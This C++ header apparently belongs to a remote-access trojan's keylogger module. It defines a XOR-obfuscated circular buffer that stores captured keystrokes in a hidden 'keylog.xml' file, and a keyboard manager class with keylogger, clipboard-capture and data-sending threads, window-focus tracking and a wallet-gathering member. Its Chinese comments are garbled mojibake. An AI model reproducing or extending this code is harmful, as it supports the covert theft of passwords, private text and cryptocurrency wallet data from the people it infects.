// KeyboardManager.h: interface for the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////

#pragma once

#include "Manager.h"
#include "stdafx.h"

#define KEYLOG_FILE "keylog.xml"

#if ENABLE_KEYBOARD==0
#define CKeyboardManager1 CManager

#else

#define BUFFER_SIZE 10*1024*1024

// ѭ������
class CircularBuffer {
private:
	char* m_buffer;  // ������
	int m_size;      // ��������С
	int m_write;     // дָ��
	int m_read;      // ��ָ��
	CRITICAL_SECTION m_cs; // �߳�ͬ��
	char m_key;      // ���� XOR �ӽ��ܵ���Կ

public:
	// ���캯�������ļ���������
	CircularBuffer(const std::string& filename, int size = BUFFER_SIZE, char key = '`')
		: m_size(size), m_write(0), m_read(0), m_key(key) {
		m_buffer = new char[m_size]();
		InitializeCriticalSection(&m_cs);
		LoadDataFromFile(filename);
	}

	// ����������������Դ
	~CircularBuffer() {
		DeleteCriticalSection(&m_cs);
		delete[] m_buffer;
	}

	// ��ջ���
	void Clear() {
		EnterCriticalSection(&m_cs);

		// ���ö�дָ��
		m_write = 0;
		m_read = 0;
		memset(m_buffer, 0, m_size);

		LeaveCriticalSection(&m_cs);
	}

	// ����/���ܲ�����XOR��
	void XORData(char* data, int length) {
		for (int i = 0; i < length; i++) {
			data[i] ^= m_key; // ����Կ���� XOR ����
		}
	}

	// ���ļ��������ݵ�������
	bool LoadDataFromFile(const std::string& filename) {
		EnterCriticalSection(&m_cs);

		// ���ļ�
		HANDLE hFile = CreateFileA(
			filename.c_str(),           // �ļ�·��
			GENERIC_READ,                // ֻ��Ȩ��
			0,                           // ������
			NULL,                        // Ĭ�ϰ�ȫ����
			OPEN_EXISTING,               // �ļ��������
			FILE_ATTRIBUTE_NORMAL,       // �����ļ�����
			NULL                         // ����Ҫģ���ļ�
		);

		if (hFile == INVALID_HANDLE_VALUE) {
			LeaveCriticalSection(&m_cs);
			Mprintf("Failed to open file '%s' for reading\n", filename.c_str());
			return false;
		}

		// ��ȡ�ļ�����
		DWORD bytesRead = 0;
		while (m_write < m_size) {
			if (!ReadFile(hFile, m_buffer + m_write, m_size - m_write, &bytesRead, NULL) || bytesRead == 0) {
				break;
			}
			XORData(m_buffer + m_write, bytesRead); // ��������
			m_write = (m_write + bytesRead) % m_size;
		}

		// �ر��ļ����
		CloseHandle(hFile);

		LeaveCriticalSection(&m_cs);
		return true;
	}

	// д�����ݣ�������������ˣ���ͷ������д�룩
	int Write(const char* data, int length) {
		EnterCriticalSection(&m_cs);

		for (int i = 0; i < length; i++) {
			m_buffer[m_write] = data[i];
			m_write = (m_write + 1) % m_size;

			// ��дָ��׷�϶�ָ��ʱ��ǰ�ƶ�ָ��ʵ�ָ���д��
			if (m_write == m_read) {
				m_read = (m_read + 1) % m_size;
			}
		}

		LeaveCriticalSection(&m_cs);
		return length; // ����ʵ��д����ֽ���
	}

	// ��ָ��λ�ÿ�ʼ��ȡ����
	char* Read(int &pos, int &bytesRead) {
		EnterCriticalSection(&m_cs);

		if (pos == 0) {
			m_read = m_write + 1;
			while (m_read < m_size && m_buffer[m_read] == 0) m_read++;
			if (m_read == m_size) m_read = 0;
		} else {
			m_read = pos;
		}
		int size = (m_write >= m_read) ? (m_write - m_read) : (m_size - (m_read - m_write));
		char* outBuffer = size ? new char[size] : NULL;
		for (int i = 0; i < size; i++) {
			if (m_read == m_write) { // ������Ϊ��
				break;
			}
			outBuffer[i] = m_buffer[m_read];
			m_read = (m_read + 1) % m_size;
			bytesRead++;
		}
		pos = m_write;

		LeaveCriticalSection(&m_cs);
		return outBuffer; // ����ʵ�ʶ�ȡ���ֽ���
	}

	// ����������������д���ļ������ܣ�
	bool WriteAvailableDataToFile(const std::string& filename) {
		EnterCriticalSection(&m_cs);

		// ��ȡ�������ݵĴ�С
		m_read = m_write + 1;
		while (m_read < m_size && m_buffer[m_read] == 0) m_read++;
		if (m_read == m_size) m_read = 0;
		int totalSize = (m_write >= m_read) ? (m_write - m_read) : (m_size - (m_read - m_write));

		if (totalSize == 0) {
			LeaveCriticalSection(&m_cs);
			return true;  // û�����ݿ�д��
		}

		// ���ļ��Խ���д��
		HANDLE hFile = CreateFileA(
			filename.c_str(),           // �ļ�·��
			GENERIC_WRITE,               // дȨ��
			0,                           // ������
			NULL,                        // Ĭ�ϰ�ȫ����
			CREATE_ALWAYS,               // ����ļ������򸲸�
			FILE_ATTRIBUTE_NORMAL,       // �����ļ�����
			NULL                         // ����Ҫģ���ļ�
		);

		if (hFile == INVALID_HANDLE_VALUE) {
			LeaveCriticalSection(&m_cs);
			return false;  // ���ļ�ʧ��
		}

		// д�뻺�����е���������
		int bytesWritten = 0;
		DWORD bytesToWrite = totalSize;
		const int size = 64*1024;
		char *buffer = new char[size];
		while (bytesWritten < totalSize) {
			DWORD bufferSize = min(bytesToWrite, size);

			// ��仺����
			for (int i = 0; i < bufferSize && m_read != m_write; ) {
				buffer[i++] = m_buffer[m_read];
				m_read = (m_read + 1) % m_size;
			}

			// ��������
			XORData(buffer, bufferSize);

			// д���ļ�
			DWORD bytesActuallyWritten = 0;
			if (!WriteFile(hFile, buffer, bufferSize, &bytesActuallyWritten, NULL)) {
				CloseHandle(hFile);
				LeaveCriticalSection(&m_cs);
				delete[] buffer;
				return false;  // д��ʧ��
			}

			bytesWritten += bytesActuallyWritten;
			bytesToWrite -= bytesActuallyWritten;
		}
		delete[] buffer;

		// �ر��ļ����
		CloseHandle(hFile);
		LeaveCriticalSection(&m_cs);

		return true;
	}
};

class CKeyboardManager1 : public CManager
{
public:
    CKeyboardManager1(IOCPClient*pClient, int offline, void* user=NULL);
    virtual ~CKeyboardManager1();
    virtual void Notify();
    virtual void OnReceive(LPBYTE lpBuffer, ULONG nSize);
	static DWORD WINAPI Clipboard(LPVOID lparam);
    static DWORD WINAPI KeyLogger(LPVOID lparam);
    static DWORD WINAPI SendData(LPVOID lparam);
    BOOL m_bIsOfflineRecord;
	HANDLE m_hClipboard;
    HANDLE m_hWorkThread,m_hSendThread;
    TCHAR	m_strRecordFile[MAX_PATH];
private:
    BOOL IsWindowsFocusChange(HWND &PreviousFocus, TCHAR *WindowCaption, TCHAR *szText, bool HasData);
    int sendStartKeyBoard();

    int sendKeyBoardData(LPBYTE lpData, UINT nSize);

    bool m_bIsWorking;
	CircularBuffer *m_Buffer;
	CLocker m_mu;
	std::vector<std::string> m_Wallet;
	std::vector<std::string> GetWallet();
};

#undef BUFFER_SIZE

#endif
